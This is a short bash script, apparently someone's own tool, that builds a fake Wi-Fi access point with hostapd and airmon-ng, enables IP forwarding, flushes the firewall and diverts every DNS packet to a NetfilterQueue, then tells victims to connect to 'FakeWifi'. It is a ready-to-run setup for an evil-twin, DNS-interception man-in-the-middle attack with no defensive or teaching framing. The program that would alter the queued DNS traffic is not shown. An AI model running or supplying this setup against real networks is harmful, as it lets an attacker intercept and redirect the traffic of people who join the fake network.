#!/bin/bash

if [[ $EUID -ne 0 ]]; then
   echo "This script must be run as root."
   exit 1
fi

# Define variables
INTERFACE="wlan0"
GATEWAY="192.168.1.1"
SUBNET="255.255.255.0"
HOSTAPD_CONF=/home/jacob/ExecutablesByJacob/hostapd.conf

# Stop interfering services
airmon-ng check kill

# Assign static IP and bring up the interface
ifconfig $INTERFACE $GATEWAY netmask $SUBNET up

# Start hostapd
echo "Starting hostapd..."
hostapd $HOSTAPD_CONF &

# Enable IP forwarding
echo "Enabling IP forwarding..."
echo 1 > /proc/sys/net/ipv4/ip_forward

# Set up iptables rules to forward DNS packets to NetfilterQueue (queue 0)
echo "Redirecting DNS packets to NetfilterQueue..."
iptables -F
iptables -t nat -F
iptables -I INPUT -p udp --dport 53 -j NFQUEUE --queue-num 0
iptables -I OUTPUT -p udp --dport 53 -j NFQUEUE --queue-num 0
iptables -I FORWARD -p udp --dport 53 -j NFQUEUE --queue-num 0

echo "Fake access point is running. Connect to SSID: FakeWifi"
